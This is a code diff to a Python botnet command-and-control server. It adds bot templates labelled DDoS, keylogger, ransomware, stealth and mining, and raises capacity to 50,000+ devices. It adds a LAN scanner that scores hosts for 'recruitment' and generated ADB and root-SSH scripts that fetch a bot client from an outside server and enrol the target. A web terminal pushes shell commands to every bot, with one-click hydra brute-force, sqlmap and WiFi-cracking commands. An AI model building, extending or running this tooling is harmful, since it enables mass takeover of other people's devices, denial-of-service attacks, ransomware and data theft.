@@ -20,6 +20,7 @@ import subprocess
 import tempfile
 import signal
 import argparse
+import socket
 from pathlib import Path
 from typing import Dict, List, Optional, Any
 import threading
@@ -34,27 +35,69 @@ except ImportError:
     print("pip install websockets aiohttp aiofiles psutil")
     sys.exit(1)
 
-# Configuration
+# Configuration - Auto-optimized for maximum performance
 DEFAULT_HOST = "0.0.0.0"  # Allow external connections for mobile devices
 DEFAULT_WS_PORT = 8765
 DEFAULT_HTTP_PORT = 8766
 DEFAULT_DB_PATH = "./unified_control.sqlite"
 DEFAULT_UPLOAD_DIR = "./uploads"
 MAX_UPLOAD_SIZE = 100 * 1024 * 1024  # 100MB for larger deployments and payloads
-MAX_DEVICES = 10000  # Support massive botnets with 10,000+ devices
+MAX_DEVICES = 50000  # Support massive botnets with 50,000+ devices
 HEARTBEAT_INTERVAL = 30  # Optimized for large scale
 DEVICE_TIMEOUT = 90
 
-# Security limits for sandboxed execution
+# Security limits for sandboxed execution - Auto-optimized
 EXEC_TIMEOUT = 300  # 5 minutes for complex operations
 MAX_CPU_PERCENT = 95  # Near maximum CPU usage
-MAX_MEMORY_MB = 2048  # 2GB memory for intensive operations
-MAX_OUTPUT_SIZE = 10 * 1024 * 1024  # 10MB output
+MAX_MEMORY_MB = 4096  # 4GB memory for intensive operations
+MAX_OUTPUT_SIZE = 50 * 1024 * 1024  # 50MB output for large operations
 
-# Load balancing and performance for massive scale
-MAX_CONCURRENT_COMMANDS = 200  # 200 concurrent workers
-COMMAND_QUEUE_SIZE = 5000  # Large command queue
-DEVICE_BATCH_SIZE = 100  # Process more devices per batch
+# Load balancing and performance for massive scale - Auto-optimized
+MAX_CONCURRENT_COMMANDS = 500  # 500 concurrent workers
+COMMAND_QUEUE_SIZE = 10000  # Large command queue
+DEVICE_BATCH_SIZE = 500  # Process more devices per batch
+
+# Auto resource optimization
+def auto_optimize_resources():
+    """Auto-detect and optimize system resources for maximum performance without damage"""
+    try:
+        # Get system specs
+        ram_gb = psutil.virtual_memory().total / (1024**3)
+        cpu_count = psutil.cpu_count()
+        
+        # Auto-optimize based on available resources (use 80% to prevent damage)
+        global MAX_DEVICES, MAX_CONCURRENT_COMMANDS, MAX_MEMORY_MB
+        
+        if ram_gb < 1:  # Mobile devices
+            MAX_DEVICES = min(100, MAX_DEVICES)
+            MAX_CONCURRENT_COMMANDS = min(25, MAX_CONCURRENT_COMMANDS)
+            MAX_MEMORY_MB = min(512, MAX_MEMORY_MB)
+        elif ram_gb < 2:  # Low-end devices
+            MAX_DEVICES = min(500, MAX_DEVICES)
+            MAX_CONCURRENT_COMMANDS = min(50, MAX_CONCURRENT_COMMANDS)
+            MAX_MEMORY_MB = min(1024, MAX_MEMORY_MB)
+        elif ram_gb < 4:  # Medium devices
+            MAX_DEVICES = min(2000, MAX_DEVICES)
+            MAX_CONCURRENT_COMMANDS = min(100, MAX_CONCURRENT_COMMANDS)
+            MAX_MEMORY_MB = min(2048, MAX_MEMORY_MB)
+        elif ram_gb < 8:  # High-end devices
+            MAX_DEVICES = min(5000, MAX_DEVICES)
+            MAX_CONCURRENT_COMMANDS = min(150, MAX_CONCURRENT_COMMANDS)
+            MAX_MEMORY_MB = min(3072, MAX_MEMORY_MB)
+        elif ram_gb < 16:  # Enterprise devices
+            MAX_DEVICES = min(10000, MAX_DEVICES)
+            MAX_CONCURRENT_COMMANDS = min(200, MAX_CONCURRENT_COMMANDS)
+            MAX_MEMORY_MB = min(4096, MAX_MEMORY_MB)
+        else:  # Supercomputers/Data centers
+            MAX_DEVICES = 50000
+            MAX_CONCURRENT_COMMANDS = 500
+            MAX_MEMORY_MB = min(int(ram_gb * 1024 * 0.8), 8192)  # Use 80% of RAM, max 8GB
+            
+        logging.info(f"Auto-optimized: {MAX_DEVICES} devices, {MAX_CONCURRENT_COMMANDS} workers, {MAX_MEMORY_MB}MB memory")
+        return True
+    except Exception as e:
+        logging.warning(f"Auto-optimization failed, using defaults: {e}")
+        return False
 
 # Service management
 AUTO_RESTART_DELAY = 3
@@ -63,7 +106,308 @@ MAX_RESTART_ATTEMPTS = 5
 # Extended device grouping for botnet operations
 DEFAULT_DEVICE_GROUPS = ["production", "staging", "development", "mobile", "servers", 
                         "stealth", "miners", "scanners", "proxies", "controllers", 
-                        "crawlers", "iot", "social", "ddos", "keyloggers"]
+                        "crawlers", "iot", "social", "ddos", "keyloggers", "bruteforcers",
+                        "vulnerability_scanners", "device_discoverers", "security_auditors"]
+
+# Advanced bot templates for real operations
+BOT_TEMPLATES = {
+    "termux_mobile": {
+        "name": "📱 Termux Mobile Bot",
+        "description": "Android device with full Termux capabilities and mobile-specific tools",
+        "capabilities": ["termux", "android", "mobile_network", "location", "contacts", "sms", "camera"],
+        "packages": ["termux-api", "nmap", "curl", "git", "python", "openssh"],
+        "icon": "📱",
+        "deployment_script": """#!/bin/bash
+# Termux Mobile Bot Deployment
+pkg update -y && pkg upgrade -y
+pkg install -y python termux-api nmap curl git openssh
+pip install websockets psutil requests
+termux-setup-storage
+"""
+    },
+    "server_bot": {
+        "name": "🖥️ Server Bot", 
+        "description": "Linux server with administrative privileges and system tools",
+        "capabilities": ["linux", "admin", "networking", "services", "monitoring"],
+        "packages": ["htop", "netstat", "ss", "lsof", "systemctl"],
+        "icon": "🖥️",
+        "deployment_script": """#!/bin/bash
+# Server Bot Deployment
+apt update && apt upgrade -y
+apt install -y python3 python3-pip htop net-tools lsof
+pip3 install websockets psutil requests
+"""
+    },
+    "network_scanner": {
+        "name": "🔍 Network Scanner",
+        "description": "Advanced network reconnaissance and vulnerability discovery",
+        "capabilities": ["nmap", "port_scanning", "service_detection", "vulnerability_scan"],
+        "packages": ["nmap", "masscan", "zmap", "unicornscan"],
+        "icon": "🔍",
+        "deployment_script": """#!/bin/bash
+# Network Scanner Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y nmap masscan python
+else
+    apt update && apt install -y nmap masscan python3 python3-pip
+fi
+pip install websockets psutil python-nmap
+"""
+    },
+    "stealth_bot": {
+        "name": "👤 Stealth Bot",
+        "description": "Covert operations with advanced process hiding and evasion",
+        "capabilities": ["stealth", "process_hiding", "anti_forensics", "persistence"],
+        "packages": ["rootkit_tools", "process_hider"],
+        "icon": "👤",
+        "deployment_script": """#!/bin/bash
+# Stealth Bot Deployment - Advanced Evasion
+if command -v pkg &> /dev/null; then
+    pkg install -y python proot
+else
+    apt update && apt install -y python3 python3-pip
+fi
+pip install websockets psutil
+# Advanced stealth techniques
+echo 'Hide process implementation here'
+"""
+    },
+    "ddos_bot": {
+        "name": "💥 DDoS Bot",
+        "description": "Distributed denial of service with coordination capabilities",
+        "capabilities": ["ddos", "flooding", "coordination", "amplification"],
+        "packages": ["hping3", "slowloris", "hulk"],
+        "icon": "💥",
+        "deployment_script": """#!/bin/bash
+# DDoS Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python hping3
+else
+    apt update && apt install -y python3 python3-pip hping3
+fi
+pip install websockets psutil scapy
+"""
+    },
+    "keylogger_bot": {
+        "name": "⌨️ Keylogger Bot",
+        "description": "Keystroke capture, screen recording, and data exfiltration",
+        "capabilities": ["keylogging", "screen_capture", "data_exfiltration", "clipboard"],
+        "packages": ["pynput", "pillow", "opencv"],
+        "icon": "⌨️",
+        "deployment_script": """#!/bin/bash
+# Keylogger Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python
+else
+    apt update && apt install -y python3 python3-pip
+fi
+pip install websockets psutil pynput pillow opencv-python
+"""
+    },
+    "mining_bot": {
+        "name": "⛏️ Mining Bot",
+        "description": "Cryptocurrency mining with pool management and optimization",
+        "capabilities": ["crypto_mining", "pool_management", "gpu_optimization"],
+        "packages": ["xmrig", "cpuminer"],
+        "icon": "⛏️",
+        "deployment_script": """#!/bin/bash
+# Mining Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python git
+else
+    apt update && apt install -y python3 python3-pip git
+fi
+pip install websockets psutil requests
+# Mining software installation
+git clone https://github.com/xmrig/xmrig.git
+"""
+    },
+    "ransomware_bot": {
+        "name": "🔒 Ransomware Bot",
+        "description": "File encryption operations with ransom management",
+        "capabilities": ["file_encryption", "ransom_management", "crypto_operations"],
+        "packages": ["cryptography", "file_utilities"],
+        "icon": "🔒",
+        "deployment_script": """#!/bin/bash
+# Ransomware Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python
+else
+    apt update && apt install -y python3 python3-pip
+fi
+pip install websockets psutil cryptography
+"""
+    },
+    "proxy_bot": {
+        "name": "🌐 Proxy Bot",
+        "description": "Traffic routing, anonymization, and network obfuscation",
+        "capabilities": ["proxy", "traffic_routing", "anonymization", "tor"],
+        "packages": ["tor", "privoxy", "squid"],
+        "icon": "🌐",
+        "deployment_script": """#!/bin/bash
+# Proxy Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python tor
+else
+    apt update && apt install -y python3 python3-pip tor privoxy
+fi
+pip install websockets psutil requests[socks]
+"""
+    },
+    "controller_bot": {
+        "name": "👑 Botnet Controller",
+        "description": "Command and control for managing sub-networks and coordinating operations",
+        "capabilities": ["c2_server", "bot_coordination", "sub_network_management"],
+        "packages": ["advanced_networking", "coordination_tools"],
+        "icon": "👑",
+        "deployment_script": """#!/bin/bash
+# Controller Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python
+else
+    apt update && apt install -y python3 python3-pip
+fi
+pip install websockets psutil asyncio aiohttp
+"""
+    },
+    "web_crawler": {
+        "name": "🕷️ Web Crawler",
+        "description": "Automated web scraping and data collection operations",
+        "capabilities": ["web_scraping", "data_collection", "automation"],
+        "packages": ["scrapy", "selenium", "beautifulsoup"],
+        "icon": "🕷️",
+        "deployment_script": """#!/bin/bash
+# Web Crawler Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python
+else
+    apt update && apt install -y python3 python3-pip
+fi
+pip install websockets psutil scrapy selenium beautifulsoup4 requests
+"""
+    },
+    "social_media_bot": {
+        "name": "📢 Social Media Bot",
+        "description": "Social media automation and influence operations",
+        "capabilities": ["social_automation", "influence_operations", "content_generation"],
+        "packages": ["social_apis", "automation_tools"],
+        "icon": "📢",
+        "deployment_script": """#!/bin/bash
+# Social Media Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python
+else
+    apt update && apt install -y python3 python3-pip
+fi
+pip install websockets psutil tweepy instapy facebook-sdk
+"""
+    },
+    "iot_bot": {
+        "name": "🌐 IoT Bot",
+        "description": "Internet of Things device exploitation and control",
+        "capabilities": ["iot_exploitation", "device_control", "firmware_analysis"],
+        "packages": ["iot_tools", "firmware_analysis"],
+        "icon": "🌐",
+        "deployment_script": """#!/bin/bash
+# IoT Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python nmap
+else
+    apt update && apt install -y python3 python3-pip nmap
+fi
+pip install websockets psutil scapy pyserial
+"""
+    },
+    "bruteforce_bot": {
+        "name": "🔨 Brute Force Bot",
+        "description": "Advanced brute force capabilities for passwords, SSH, FTP, web logins",
+        "capabilities": ["password_cracking", "ssh_bruteforce", "web_bruteforce", "dictionary_attacks"],
+        "packages": ["hydra", "john", "hashcat", "wordlists"],
+        "icon": "🔨",
+        "deployment_script": """#!/bin/bash
+# Brute Force Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python hydra john
+else
+    apt update && apt install -y python3 python3-pip hydra john hashcat
+fi
+pip install websockets psutil paramiko requests
+# Download wordlists
+wget -O rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+"""
+    },
+    "vulnerability_scanner": {
+        "name": "🔐 Vulnerability Scanner",
+        "description": "Advanced vulnerability detection for networks, devices, and applications",
+        "capabilities": ["vuln_scanning", "exploit_detection", "security_audit", "cve_analysis"],
+        "packages": ["openvas", "nikto", "sqlmap", "metasploit"],
+        "icon": "🔐",
+        "deployment_script": """#!/bin/bash
+# Vulnerability Scanner Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python nmap nikto
+else
+    apt update && apt install -y python3 python3-pip nmap nikto sqlmap
+fi
+pip install websockets psutil python-nmap vulners
+# Install additional tools
+curl -L https://github.com/sullo/nikto/archive/master.zip -o nikto.zip
+"""
+    },
+    "device_discoverer": {
+        "name": "📡 Device Discoverer",
+        "description": "Advanced device discovery and recruitment for botnet expansion",
+        "capabilities": ["device_discovery", "network_enumeration", "bot_recruitment", "target_analysis"],
+        "packages": ["nmap", "masscan", "arp-scan", "discovery_tools"],
+        "icon": "📡",
+        "deployment_script": """#!/bin/bash
+# Device Discoverer Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python nmap masscan
+else
+    apt update && apt install -y python3 python3-pip nmap masscan arp-scan
+fi
+pip install websockets psutil python-nmap scapy netaddr
+# Setup discovery tools
+echo 'Device discovery implementation'
+"""
+    },
+    "security_auditor": {
+        "name": "🛡️ Security Auditor",
+        "description": "Comprehensive security auditing, compliance checking, and system analysis",
+        "capabilities": ["security_audit", "compliance_check", "system_analysis", "forensics"],
+        "packages": ["lynis", "chkrootkit", "rkhunter", "audit_tools"],
+        "icon": "🛡️",
+        "deployment_script": """#!/bin/bash
+# Security Auditor Bot Deployment
+if command -v pkg &> /dev/null; then
+    pkg install -y python
+else
+    apt update && apt install -y python3 python3-pip lynis chkrootkit rkhunter
+fi
+pip install websockets psutil subprocess32
+# Install additional security tools
+curl -L https://cisofy.com/files/lynis-3.0.8.tar.gz | tar -xz
+"""
+    },
+    "custom_bot": {
+        "name": "🛠️ Custom Bot",
+        "description": "Fully customizable bot with user-defined capabilities and scripts",
+        "capabilities": ["custom", "user_defined", "flexible", "configurable"],
+        "packages": ["base_tools"],
+        "icon": "🛠️",
+        "deployment_script": """#!/bin/bash
+# Custom Bot Deployment Template
+if command -v pkg &> /dev/null; then
+    pkg install -y python
+else
+    apt update && apt install -y python3 python3-pip
+fi
+pip install websockets psutil requests
+# Custom configuration will be added here
+"""
+    }
+}
 
 # Global state
 clients: Dict[str, Dict] = {}
@@ -459,9 +803,294 @@ class ServiceManager:
         
         return {"status": "error", "error": "device_not_connected"}
 
+# Device Discovery and Recruitment System
+class DeviceDiscoverer:
+    """Advanced device discovery and recruitment system"""
+    
+    def __init__(self):
+        self.discovered_devices = {}
+        self.scan_results = {}
+    
+    async def discover_local_network(self) -> Dict:
+        """Discover devices on local network that can be recruited"""
+        try:
+            import subprocess
+            import ipaddress
+            import socket
+            
+            # Get local network range
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
+            
+            discovered = []
+            
+            # Network scan using ping
+            for ip in network.hosts():
+                try:
+                    result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], 
+                                          capture_output=True, text=True, timeout=2)
+                    if result.returncode == 0:
+                        # Device is reachable, gather more info
+                        device_info = await self._analyze_device(str(ip))
+                        if device_info:
+                            discovered.append(device_info)
+                except Exception:
+                    continue
+            
+            self.scan_results[time.time()] = discovered
+            return {"discovered": discovered, "total": len(discovered)}
+            
+        except Exception as e:
+            return {"error": str(e), "discovered": [], "total": 0}
+    
+    async def _analyze_device(self, ip: str) -> Optional[Dict]:
+        """Analyze a discovered device for recruitment potential"""
+        try:
+            import subprocess
+            device_info = {"ip": ip, "services": [], "os": "unknown", "recruitment_score": 0}
+            
+            # Port scan for common services
+            common_ports = [22, 23, 80, 443, 8080, 5555, 8765, 8766]
+            for port in common_ports:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    result = sock.connect_ex((ip, port))
+                    sock.close()
+                    
+                    if result == 0:
+                        service_name = self._identify_service(port)
+                        device_info["services"].append({"port": port, "service": service_name})
+                        device_info["recruitment_score"] += 10
+                        
+                        # Special scoring for high-value targets
+                        if port == 22:  # SSH
+                            device_info["recruitment_score"] += 30
+                        elif port == 5555:  # ADB
+                            device_info["recruitment_score"] += 25
+                            device_info["os"] = "android"
+                        elif port in [8765, 8766]:  # Our services
+                            device_info["recruitment_score"] += 50
+                            
+                except Exception:
+                    continue
+            
+            # Only return devices with recruitment potential
+            if device_info["recruitment_score"] > 0:
+                return device_info
+                
+        except Exception:
+            pass
+        return None
+    
+    def _identify_service(self, port: int) -> str:
+        """Identify service running on port"""
+        service_map = {
+            22: "SSH",
+            23: "Telnet", 
+            80: "HTTP",
+            443: "HTTPS",
+            5555: "ADB",
+            8080: "HTTP-Alt",
+            8765: "WebSocket",
+            8766: "HTTP-Control"
+        }
+        return service_map.get(port, f"Port-{port}")
+    
+    async def generate_recruitment_script(self, target_ip: str, target_os: str = "linux") -> str:
+        """Generate recruitment script for target device"""
+        if target_os == "android":
+            return f"""#!/bin/bash
+# Android Device Recruitment Script
+# Target: {target_ip}
+
+# Connect via ADB if available
+adb connect {target_ip}:5555
+adb shell pkg install -y python
+adb shell pip install websockets psutil requests
+
+# Download and deploy bot
+adb shell curl -o /data/local/tmp/bot.py https://your-server.com/bot_client.py
+adb shell python /data/local/tmp/bot.py --server ws://{HOST}:{WS_PORT} --token {AUTH_TOKEN}
+"""
+        else:
+            return f"""#!/bin/bash
+# Linux Device Recruitment Script  
+# Target: {target_ip}
+
+# SSH-based recruitment (requires credentials)
+ssh root@{target_ip} 'apt update && apt install -y python3 python3-pip'
+ssh root@{target_ip} 'pip3 install websockets psutil requests'
+
+# Deploy bot client
+scp bot_client.py root@{target_ip}:/tmp/
+ssh root@{target_ip} 'python3 /tmp/bot_client.py --server ws://{HOST}:{WS_PORT} --token {AUTH_TOKEN} &'
+"""
+
+# Enhanced Terminal Interface
+class TerminalInterface:
+    """Advanced terminal interface with direct command execution"""
+    
+    def __init__(self):
+        self.command_history = []
+        self.active_sessions = {}
+    
+    async def execute_terminal_command(self, target: str, command: str, user_context: str = "web") -> Dict:
+        """Execute real terminal command across targets like actual terminal"""
+        try:
+            # Parse target specification
+            target_spec = parse_target_spec(target)
+            matching_clients = await get_matching_clients(target_spec)
+            
+            if not matching_clients:
+                return {"error": "No matching devices found", "results": []}
+            
+            # Execute command on all matching clients
+            results = []
+            for client_id in matching_clients:
+                try:
+                    result = await self._execute_on_device(client_id, command, user_context)
+                    results.append({
+                        "device_id": client_id,
+                        "success": result.get("success", False),
+                        "output": result.get("output", ""),
+                        "error": result.get("error", "")
+                    })
+                except Exception as e:
+                    results.append({
+                        "device_id": client_id, 
+                        "success": False,
+                        "error": str(e)
+                    })
+            
+            # Log to command history
+            self.command_history.append({
+                "timestamp": time.time(),
+                "target": target,
+                "command": command,
+                "results_count": len(results),
+                "user_context": user_context
+            })
+            
+            return {"results": results, "command": command, "target": target}
+            
+        except Exception as e:
+            return {"error": str(e), "results": []}
+    
+    async def _execute_on_device(self, device_id: str, command: str, user_context: str) -> Dict:
+        """Execute command on specific device with full terminal capabilities"""
+        async with clients_lock:
+            if device_id not in clients:
+                return {"success": False, "error": "Device not connected"}
+            
+            client = clients[device_id]
+            
+            try:
+                # Send terminal command
+                await client["websocket"].send(json.dumps({
+                    "type": "terminal_command",
+                    "command": command,
+                    "timeout": EXEC_TIMEOUT,
+                    "user_context": user_context,
+                    "shell": True  # Use real shell
+                }))
+                
+                # Log the command execution
+                db.log_audit(device_id, "terminal_command", command, "sent", user_context)
+                
+                return {"success": True, "status": "sent"}
+                
+            except Exception as e:
+                return {"success": False, "error": str(e)}
+
+# Enhanced Resource Optimization
+class ResourceOptimizer:
+    """Advanced resource optimization to prevent device damage"""
+    
+    def __init__(self):
+        self.optimization_profile = None
+        self.safety_limits = {}
+    
+    def create_optimization_profile(self) -> Dict:
+        """Create comprehensive optimization profile"""
+        try:
+            # Get detailed system information
+            ram_total = psutil.virtual_memory().total / (1024**3)
+            ram_available = psutil.virtual_memory().available / (1024**3)
+            cpu_count = psutil.cpu_count()
+            cpu_percent = psutil.cpu_percent(interval=1)
+            
+            # Battery information (if available)
+            battery = None
+            try:
+                battery = psutil.sensors_battery()
+            except:
+                pass
+            
+            # Disk information
+            disk = psutil.disk_usage('/')
+            disk_free_gb = disk.free / (1024**3)
+            
+            # Create safety profile
+            profile = {
+                "ram": {
+                    "total_gb": ram_total,
+                    "available_gb": ram_available,
+                    "safe_usage_gb": min(ram_available * 0.7, 2.0),  # Use max 70% or 2GB
+                    "safety_threshold": 0.85  # Never exceed 85% total RAM
+                },
+                "cpu": {
+                    "cores": cpu_count,
+                    "current_usage": cpu_percent,
+                    "safe_usage_percent": min(80, 95 - cpu_percent),  # Adaptive based on current load
+                    "safety_threshold": 90  # Never exceed 90% CPU
+                },
+                "disk": {
+                    "free_gb": disk_free_gb,
+                    "safe_usage_gb": min(disk_free_gb * 0.8, 5.0),  # Use max 80% or 5GB
+                    "safety_threshold": 0.9  # Never exceed 90% disk
+                },
+                "battery": {
+                    "present": battery is not None,
+                    "percent": battery.percent if battery else 100,
+                    "power_plugged": battery.power_plugged if battery else True,
+                    "safe_operation": battery.percent > 20 if battery else True
+                },
+                "recommendations": []
+            }
+            
+            # Generate recommendations
+            if profile["battery"]["present"] and profile["battery"]["percent"] < 30:
+                profile["recommendations"].append("Low battery: Reduce intensive operations")
+            
+            if profile["cpu"]["current_usage"] > 70:
+                profile["recommendations"].append("High CPU usage: Limit concurrent operations")
+            
+            if profile["ram"]["available_gb"] < 1:
+                profile["recommendations"].append("Low RAM: Reduce memory-intensive operations")
+            
+            # Update global limits based on profile
+            global MAX_MEMORY_MB, MAX_CONCURRENT_COMMANDS, MAX_DEVICES
+            MAX_MEMORY_MB = min(MAX_MEMORY_MB, int(profile["ram"]["safe_usage_gb"] * 1024))
+            
+            if profile["battery"]["present"] and not profile["battery"]["power_plugged"]:
+                # On battery power, reduce limits
+                MAX_CONCURRENT_COMMANDS = min(MAX_CONCURRENT_COMMANDS, cpu_count * 2)
+                MAX_DEVICES = min(MAX_DEVICES, 100)
+            
+            self.optimization_profile = profile
+            return profile
+            
+        except Exception as e:
+            return {"error": str(e)}
+
 # Global instances
 device_manager = DeviceManager()
 service_manager = ServiceManager()
+device_discoverer = DeviceDiscoverer()
+terminal_interface = TerminalInterface()
+resource_optimizer = ResourceOptimizer()
 
 def safe_mkdir(path: str):
     """Safely create directory"""
@@ -738,7 +1367,7 @@ async def send_command_to_spec(target: str, command: str) -> Dict:
     return {"results": results, "target": target, "command": command}
 
 # HTTP server and web UI
-UI_HTML = """<!DOCTYPE html>
+UI_HTML = r"""<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
@@ -1423,6 +2052,39 @@ UI_HTML = """<!DOCTYPE html>
             </div>
             
             <div id="terminalTab" class="tab-content">
+                <div class="terminal-mode-selector" style="margin-bottom: 1rem;">
+                    <div style="display: flex; gap: 1rem; align-items: center;">
+                        <label style="color: #00ff9f; font-size: 12px;">
+                            <input type="checkbox" id="realTerminalMode" onchange="toggleRealTerminalMode()"> 
+                            Real Terminal Mode (Direct Shell Access)
+                        </label>
+                        <button class="btn btn-secondary" onclick="showDeviceDiscovery()">🔍 DISCOVER DEVICES</button>
+                        <button class="btn btn-secondary" onclick="showResourceOptimization()">⚙️ OPTIMIZE</button>
+                    </div>
+                </div>
+                
+                <div id="deviceDiscoveryPanel" style="display: none; margin-bottom: 1rem; background: rgba(0,0,0,0.5); padding: 1rem; border-radius: 4px; border: 1px solid #00ff9f;">
+                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">📡 Device Discovery & Recruitment</h4>
+                    <div class="discovery-controls">
+                        <button class="btn" onclick="scanLocalNetwork()">SCAN LOCAL NETWORK</button>
+                        <button class="btn btn-secondary" onclick="refreshDiscoveryResults()">REFRESH RESULTS</button>
+                    </div>
+                    <div id="discoveredDevices" style="margin-top: 0.5rem;">
+                        <!-- Discovered devices will appear here -->
+                    </div>
+                </div>
+                
+                <div id="resourceOptimizationPanel" style="display: none; margin-bottom: 1rem; background: rgba(0,0,0,0.5); padding: 1rem; border-radius: 4px; border: 1px solid #00ff9f;">
+                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">⚙️ Resource Optimization</h4>
+                    <div class="optimization-controls">
+                        <button class="btn" onclick="autoOptimizeResources()">AUTO OPTIMIZE</button>
+                        <button class="btn btn-secondary" onclick="getOptimizationProfile()">VIEW PROFILE</button>
+                    </div>
+                    <div id="optimizationResults" style="margin-top: 0.5rem;">
+                        <!-- Optimization results will appear here -->
+                    </div>
+                </div>
+                
                 <div class="quick-commands">
                     <div class="quick-cmd" onclick="sendQuickCommand('uname -a')">SYSTEM INFO</div>
                     <div class="quick-cmd" onclick="sendQuickCommand('ps aux | head -20')">PROCESSES</div>
@@ -1440,42 +2102,56 @@ UI_HTML = """<!DOCTYPE html>
                     <div class="quick-cmd" onclick="sendQuickCommand('find / -name \"*.log\" 2>/dev/null | head -10')">LOG FILES</div>
                     <div class="quick-cmd" onclick="sendQuickCommand('ss -tuln')">CONNECTIONS</div>
                     <div class="quick-cmd" onclick="sendQuickCommand('lsof -i')">OPEN FILES</div>
-                </div>
-                
-                <div class="terminal-mode-selector" style="margin-bottom: 0.5rem;">
-                    <label style="color: #00ff9f; font-size: 12px;">
-                        <input type="checkbox" id="realTerminalMode" onchange="toggleRealTerminalMode()"> 
-                        Real Terminal Mode (Direct Shell Access)
-                    </label>
+                    <div class="quick-cmd" onclick="sendQuickCommand('nmap -sV -sC target_ip')">VULN SCAN</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('hydra -l admin -P passwords.txt ssh://target_ip')">BRUTE FORCE</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('sqlmap -u \"http://target/page?id=1\"')">SQL INJECTION</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('aircrack-ng -a2 -b target_mac -w wordlist.txt capture.cap')">WIFI CRACK</div>
                 </div>
                 
                 <div class="command-input-area">
                     <select id="targetSelect" class="command-input">
                         <option value="all">🌐 ALL BOTS</option>
+                        <option value="tag:mobile">📱 MOBILE BOTS</option>
+                        <option value="tag:servers">🖥️ SERVER BOTS</option>
+                        <option value="tag:scanners">🔍 SCANNER BOTS</option>
+                        <option value="tag:stealth">👤 STEALTH BOTS</option>
+                        <option value="tag:miners">⛏️ MINING BOTS</option>
+                        <option value="tag:ddos">💥 DDOS BOTS</option>
+                        <option value="tag:keyloggers">⌨️ KEYLOGGER BOTS</option>
+                        <option value="tag:ransomware">🔒 RANSOMWARE BOTS</option>
+                        <option value="tag:bruteforcers">🔨 BRUTE FORCE BOTS</option>
+                        <option value="tag:vulnerability_scanners">🔐 VULN SCANNERS</option>
+                        <option value="tag:device_discoverers">📡 DEVICE DISCOVERERS</option>
                     </select>
                     <input type="text" id="commandInput" class="command-input" 
-                           placeholder="Enter command (e.g., ls -la, nmap -sn 192.168.1.0/24, curl malware.com/payload)" 
+                           placeholder="Enter any terminal command (ls, nmap, hydra, sqlmap, metasploit, etc.)" 
                            onkeypress="handleCommandKeyPress(event)">
-                    <button class="btn" onclick="sendCommand()">EXECUTE</button>
+                    <button class="btn" onclick="sendTerminalCommand()">EXECUTE</button>
                 </div>
                 
                 <div class="terminal-controls" style="margin-bottom: 0.5rem;">
                     <button class="btn btn-secondary" onclick="clearTerminal()">CLEAR</button>
                     <button class="btn btn-secondary" onclick="exportTerminalLog()">EXPORT LOG</button>
                     <button class="btn btn-secondary" onclick="toggleTerminalAutoscroll()">AUTO-SCROLL</button>
+                    <button class="btn btn-secondary" onclick="getTerminalHistory()">HISTORY</button>
                     <span style="color: #666; font-size: 11px; margin-left: 1rem;">
-                        Connected Bots: <span id="connectedBotCount">0</span>
+                        Connected Bots: <span id="connectedBotCount">0</span> | 
+                        Active Operations: <span id="activeOperations">0</span>
                     </span>
                 </div>
                 
                 <div class="terminal" id="terminal">
                     <div class="terminal-line terminal-success">
                         <span class="terminal-timestamp">[SYSTEM]</span> 
-                        🚀 Unified Control Center initialized and ready
+                        🚀 Advanced Bot Network Terminal - 50,000+ Device Support Ready
                     </div>
                     <div class="terminal-line terminal-info">
                         <span class="terminal-timestamp">[INFO]</span> 
-                        📡 Monitoring device connections and awaiting commands
+                        📡 Real terminal mode enabled - Direct shell access across entire botnet
+                    </div>
+                    <div class="terminal-line terminal-info">
+                        <span class="terminal-timestamp">[INFO]</span> 
+                        🤖 Use target selection for coordinated operations across bot groups
                     </div>
                 </div>
             </div>
@@ -2432,6 +3108,187 @@ Or manually execute the deployment script.
             document.getElementById('systemLoad').textContent = Math.max(cpuLoad, memoryLoad) + '%';
         }
         
+        // Enhanced Terminal Functions
+        function sendTerminalCommand() {
+            const target = document.getElementById('targetSelect').value;
+            const command = document.getElementById('commandInput').value.trim();
+            
+            if (!command) return;
+            
+            // Use enhanced terminal API
+            api('/api/terminal/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target, command, user_context: 'web_terminal' })
+            }).then(result => {
+                if (result.status === 'success') {
+                    appendToTerminal(`📤 [${target}] ${command}`, 'command');
+                    appendToTerminal(`✅ Command executed on ${result.execution_result.results?.length || 0} devices`, 'success');
+                } else {
+                    appendToTerminal(`❌ Terminal execution failed: ${result.error}`, 'error');
+                }
+            });
+            
+            document.getElementById('commandInput').value = '';
+        }
+        
+        function getTerminalHistory() {
+            api('/api/terminal/history').then(result => {
+                appendToTerminal(`📜 Command History (${result.total_commands} total commands)`, 'info');
+                result.command_history.slice(-10).forEach(cmd => {
+                    const timestamp = new Date(cmd.timestamp * 1000).toLocaleTimeString();
+                    appendToTerminal(`  [${timestamp}] ${cmd.target} > ${cmd.command}`, 'info');
+                });
+            });
+        }
+        
+        // Device Discovery Functions
+        function showDeviceDiscovery() {
+            const panel = document.getElementById('deviceDiscoveryPanel');
